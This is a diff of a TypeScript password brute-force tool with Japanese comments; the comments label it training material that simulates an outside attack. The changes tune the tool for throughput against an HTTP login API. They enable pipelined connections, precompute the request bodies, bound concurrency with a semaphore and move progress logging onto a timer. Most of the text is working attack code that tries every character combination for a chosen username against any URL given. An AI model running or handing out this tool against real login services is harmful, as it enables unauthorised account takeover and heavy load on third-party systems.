@@ -4,6 +4,7 @@
  * ブルートフォース攻撃ツール（実習用）
  *
  * すべての文字の組み合わせを順番に試行します。
+ * ※ 認証は必ずHTTP経由で行います（外部攻撃シミュレーション）
  *
  * 使い方:
  *   npm run brute -- --target <username> [options]
@@ -17,8 +18,8 @@
  *   --max-length   <number>   パスワードの最大文字数 (デフォルト: 6)
  *   --url          <string>   ベースURL (デフォルト: http://localhost:3000)
  *   --limit        <number>   試行上限数 (デフォルト: 無制限)
- *   --concurrency  <number>   同時リクエスト数 (デフォルト: 5000)
- *   --log-interval <number>   進捗ログを出力する試行間隔 (デフォルト: 1)
+ *   --concurrency  <number>   同時リクエスト数 (デフォルト: 50)
+ *   --log-interval <number>   進捗ログの出力間隔ミリ秒 (デフォルト: 200ms)
  *   --verbose                 全試行のログを出力 (--log-interval より優先)
  *   --resume       <string>   途中再開する開始パスワード (例: "aab")
  */
@@ -31,6 +32,7 @@ const CHARSETS: Record<string, string> = {
   digits: '0123456789',
   lower:  'abcdefghijklmnopqrstuvwxyz',
   upper:  'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
+  lownm:  'abcdefghijklmnopqrstuvwxyz0123456789',
   alpha:  'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
   alnum:  'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
   strong:    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/',
@@ -54,13 +56,13 @@ const CHARSET_KEY  = getArg('--charset') ?? 'digits';
 const CHARSET      = CHARSETS[CHARSET_KEY] ?? CHARSET_KEY; // プリセットかカスタム文字列
 const MIN_LENGTH   = getArg('--min-length')   ? parseInt(getArg('--min-length')!,   10) : 1;
 const MAX_LENGTH   = getArg('--max-length')   ? parseInt(getArg('--max-length')!,   10) : 4;
-const BASE_URL     = getArg('--url')          ?? 'http://localhost:3000';
+const BASE_URL     = getArg('--url')          ?? 'http://localhost:3001';
 const LIMIT        = getArg('--limit')        ? parseInt(getArg('--limit')!,        10) : Infinity;
-const CONCURRENCY  = getArg('--concurrency')  ? parseInt(getArg('--concurrency')!,  10) : 5000;
-const LOG_INTERVAL = getArg('--log-interval') ? parseInt(getArg('--log-interval')!, 10) : 1;
-const VERBOSE      = hasFlag('--verbose');
-const RESUME       = getArg('--resume') ?? null;
-const API_URL      = `${BASE_URL}/api`;
+const CONCURRENCY    = getArg('--concurrency')  ? parseInt(getArg('--concurrency')!,  10) : 200;
+const LOG_INTERVAL_MS = getArg('--log-interval') ? parseInt(getArg('--log-interval')!, 10) : 50; // ミリ秒
+const VERBOSE        = hasFlag('--verbose');
+const RESUME         = getArg('--resume') ?? null;
+const API_URL        = `${BASE_URL}/api`;
 
 if (!TARGET) {
   console.error(JSON.stringify({
@@ -170,29 +172,61 @@ function getPool(): Pool {
     const url = new URL(BASE_URL);
     _pool = new Pool(`${url.protocol}//${url.host}`, {
       connections: CONCURRENCY,
-      pipelining: 1,
-      keepAliveTimeout:    30_000,
-      keepAliveMaxTimeout: 30_000,
+      pipelining: 10,      // 1接続でHTTPリクエストを多重化
+      keepAliveTimeout:    60_000,
+      keepAliveMaxTimeout: 60_000,
+      headersTimeout:      10_000, // 遅延リクエストを早期タイムアウト
+      bodyTimeout:         10_000,
     });
   }
   return _pool;
 }
+
+// リクエストパスを一度だけ計算（毎回 new URL() するコストを排除）
+const _apiPath = (() => {
+  const u = new URL(BASE_URL);
+  return `${u.pathname.replace(/\/$/, '')}/api`;
+})();
+
+// usernameのJSONプレフィックスをキャッシュ（毎回 JSON.stringify するコストを削減）
+const _bodyPrefix = `{"username":${JSON.stringify(TARGET ?? '')},"password":"`;
+const _bodySuffix = `"}`;
+// プレフィックスとサフィックスのバイト長をキャッシュ（Content-Length計算コスト削減）
+const _prefixLen  = Buffer.byteLength(_bodyPrefix);
+const _suffixLen  = Buffer.byteLength(_bodySuffix);
 
 async function tryLogin(username: string, password: string): Promise<{
   success: boolean;
   status: number;
   body: unknown;
 }> {
-  const url  = new URL(BASE_URL);
-  const path = `${url.pathname.replace(/\/$/, '')}/api`;
+  // パスワード部分だけを結合してJSONを構築（JSON.stringify全体より高速）
+  const escapedPw  = password.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+  const requestBody = _bodyPrefix + escapedPw + _bodySuffix;
+  const contentLen  = _prefixLen + Buffer.byteLength(escapedPw) + _suffixLen;
   const { statusCode, body } = await getPool().request({
-    path,
+    path:    _apiPath,
     method:  'POST',
-    headers: { 'content-type': 'application/json' },
-    body:    JSON.stringify({ username, password }),
+    headers: {
+      'content-type':   'application/json',
+      'content-length': String(contentLen), // 事前計算でundici内部計算を省略
+    },
+    body:    requestBody,
   });
-  const data = await body.json();
-  return { success: statusCode === 200, status: statusCode, body: data };
+  if (statusCode === 200) {
+    // 成功時のみJSONをパースしてユーザー情報を取得
+    const data = await body.json();
+    return { success: true, status: statusCode, body: data };
+  }
+  // 失敗時はストリームを読み捨てる（バッファ確保なし）
+  // undici BodyReadable は .dump() または .resume() で高速破棄
+  body.resume();
+  await new Promise<void>((resolve) => {
+    body.once('end',   resolve);
+    body.once('error', resolve);
+    body.once('close', resolve);
+  });
+  return { success: false, status: statusCode, body: null };
 }
 
 // ─── メイン処理 ───────────────────────────────────────────────────────────────
@@ -211,7 +245,7 @@ async function main(): Promise<void> {
     api_url: API_URL,
     limit: LIMIT === Infinity ? 'unlimited' : LIMIT,
     concurrency: CONCURRENCY,
-    log_interval: VERBOSE ? 'verbose (all)' : LOG_INTERVAL,
+    log_interval: VERBOSE ? 'verbose (all)' : `${LOG_INTERVAL_MS}ms`,
     verbose: VERBOSE,
     resume: RESUME ?? 'none',
   });
@@ -220,19 +254,43 @@ async function main(): Promise<void> {
   let queued        = 0;
   let found         = false;
   let foundPassword: string | null = null;
+  let lastPassword  = '';  // 最後に試行したパスワード（setIntervalログ用）
+
+  // ─── 時間ベースのプログレスログ（ホットパスから完全切り離し）─────────────
+  // setInterval で独立して動作するため、リクエストループはログ判定コストゼロ
+  let progressTimer: ReturnType<typeof setInterval> | null = null;
+  if (!VERBOSE) {
+    progressTimer = setInterval(() => {
+      if (attempt === 0) return;
+      const elapsedSec = ((Date.now() - startTime) / 1000).toFixed(1);
+      const rate       = (attempt / parseFloat(elapsedSec)).toFixed(0);
+      const progress   = TOTAL_COMBINATIONS < Infinity
+        ? ((attempt / TOTAL_COMBINATIONS) * 100).toFixed(2) + '%'
+        : 'N/A';
+      process.stdout.write(
+        JSON.stringify({
+          timestamp:          new Date().toISOString(),
+          event:              'progress',
+          attempts:           attempt,
+          total_combinations: TOTAL_COMBINATIONS,
+          progress,
+          elapsed_sec:        parseFloat(elapsedSec),
+          rate_per_sec:       parseInt(rate, 10),
+          last_password:      lastPassword,
+        }) + '\n',
+      );
+    }, LOG_INTERVAL_MS);
+  }
 
   // Semaphore で O(1) の並行制御（Promise.race による O(n) スキャンを排除）
   const sem = new Semaphore(CONCURRENCY);
 
   const runOne = async (password: string): Promise<void> => {
-    await sem.acquire();
-    if (found) {
-      sem.release();
-      return;
-    }
+    // sem はループ側で acquire 済み
     try {
       const result = await tryLogin(TARGET!, password);
       attempt++;
+      lastPassword = password;
 
       if (VERBOSE) {
         log({
@@ -242,23 +300,8 @@ async function main(): Promise<void> {
           password,
           status: result.status,
         });
-      } else if (attempt % LOG_INTERVAL === 0) {
-        const elapsedSec = ((Date.now() - startTime) / 1000).toFixed(1);
-        const rate       = (attempt / parseFloat(elapsedSec)).toFixed(0);
-        const progress   = TOTAL_COMBINATIONS < Infinity
-          ? ((attempt / TOTAL_COMBINATIONS) * 100).toFixed(2) + '%'
-          : 'N/A';
-        log({
-          event: 'progress',
-          attempts: attempt,
-          total_combinations: TOTAL_COMBINATIONS,
-          progress,
-          concurrency: CONCURRENCY,
-          elapsed_sec: parseFloat(elapsedSec),
-          rate_per_sec: parseInt(rate, 10),
-          last_password: password,
-        });
       }
+      // 非VERBOSEのprogressログはsetIntervalが担うため、ここでは何もしない
 
       if (result.success) {
         found         = true;
@@ -266,33 +309,6 @@ async function main(): Promise<void> {
         const user    = (result.body as { user?: Record<string, unknown> }).user ?? null;
         const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
         const message = `Target:${TARGET} Password:${foundPassword}`;
-
-        // ─── 見つけた！バナー（stderr に出力） ──────────────────────────────
-        const W      = 62;
-        const border = '★'.repeat(W);
-        const pad    = (text: string) => {
-          const space = W - 2 - text.length;
-          const l     = Math.floor(space / 2);
-          const r     = space - l;
-          return `★${' '.repeat(l)}${text}${' '.repeat(r)}★`;
-        };
-
-        console.error('');
-        console.error(border);
-        console.error(pad(''));
-        console.error(pad('🎉  パスワードが見つかりました！  🎉'));
-        console.error(pad(''));
-        console.error(border);
-        console.error('');
-        console.error('┌─────────────────────────────────────────────────────┐');
-        console.error(`│  👤 ユーザー名  ：  ${TARGET!.padEnd(30)} │`);
-        console.error(`│  🔑 パスワード  ：  ${foundPassword!.padEnd(30)} │`);
-        console.error('├─────────────────────────────────────────────────────┤');
-        console.error(`│  🔢 試行回数    ：  ${String(attempt).padEnd(30)} │`);
-        console.error(`│  ⏱  経過時間    ：  ${(elapsed + '秒').padEnd(30)} │`);
-        console.error(`│  👥 ユーザー情報：  ${(user ? JSON.stringify(user) : 'なし').substring(0, 30).padEnd(30)} │`);
-        console.error('└─────────────────────────────────────────────────────┘');
-        console.error('');
 
         log({
           event: 'success',
@@ -312,9 +328,10 @@ async function main(): Promise<void> {
     }
   };
 
-  // 全パスワードをすぐにディスパッチ（Semaphore がバックプレッシャーを担う）
+  // ループ側で acquire → バックプレッシャーにより CONCURRENCY 件ぶんだけ先行
+  // （旧: runOne 内で acquire → for ループが全パスワードを同期走破して
+  //   Semaphore キューに全量積み込み、I/O が回らずバッチ処理に見えていた）
   const generator = generatePasswords(CHARSET, MIN_LENGTH, MAX_LENGTH, RESUME);
-  const dispatched: Promise<void>[] = [];
 
   for (const password of generator) {
     if (found) break;
@@ -325,10 +342,18 @@ async function main(): Promise<void> {
     }
 
     queued++;
-    dispatched.push(runOne(password));
+    await sem.acquire();           // 空きスロットを待つ（バックプレッシャー）
+    if (found) { sem.release(); break; }
+    void runOne(password);         // fire-and-forget（sem は runOne の finally で解放）
   }
 
-  await Promise.allSettled(dispatched);
+  // 全スロットを再取得 = すべてのワーカーが完了した証明
+  for (let i = 0; i < CONCURRENCY; i++) {
+    await sem.acquire();
+  }
+
+  // プログレスタイマー停止
+  if (progressTimer) clearInterval(progressTimer);
 
   // 接続プールを閉じてプロセスが hang しないようにする
   if (_pool) await _pool.close();
